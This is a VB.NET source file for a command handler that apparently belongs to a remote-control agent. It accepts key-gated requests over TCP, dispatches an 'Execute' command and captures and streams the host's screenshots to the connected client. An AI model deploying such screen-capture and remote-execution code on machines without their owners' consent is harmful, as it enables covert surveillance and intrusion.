
Imports System.Net.Sockets
Imports Newtonsoft.Json

Namespace Alduin.Stump.Class.Commands
    Public Class CommandHandler
        Public Sub New()

        End Sub
        Public Function CommandHandler(ByVal request As String, ByVal client As TcpClient) As String
            Dim method As String = JsonMethodSelector(request)
            Select Case method
                Case "Execute"
                    Dim ModelDes As ExecuteModel = JsonConvert.DeserializeAnonymousType(request, New ExecuteModel)
                    Return Handler(ModelDes)
                Case "Website"
            End Select
            Dim url As String = RequestSplitter(request)
            Select Case url
                Case "Forbidden"
                    Return "Forbidden"
                Case "GetScreenShot"
                    StreamWriterImg(TakeScreenShot.TakeScreenShot(), client)
                    Return ""
            End Select
            Return "Command execute Failed!"
        End Function
        Public Function JsonMethodSelector(ByVal request As String) As String
            Dim method As String = ""
            For i = request.IndexOf("Method") To request.Length - 1
                If request.Chars(i) = "}" Or request.Chars(i) = "," Then
                    Exit For
                End If
                method += request.Chars(i)
            Next
            method = method.Replace("""", "").Replace(":", "").Replace(" ", "").Replace(",", "").Replace("Method", "")
            Return method
        End Function
        Public Function RequestSplitter(ByVal model As String)
            Dim header As String() = model.Split(New Char() {" "c})
            Dim splitUrl As String() = header(1).Split(New Char() {"/"c})
            If splitUrl(0) = Main.Config.Variables.CertifiedKey Then
                Return splitUrl(1)
            Else
                Return "Forbidden"
            End If
        End Function
    End Class
End Namespace


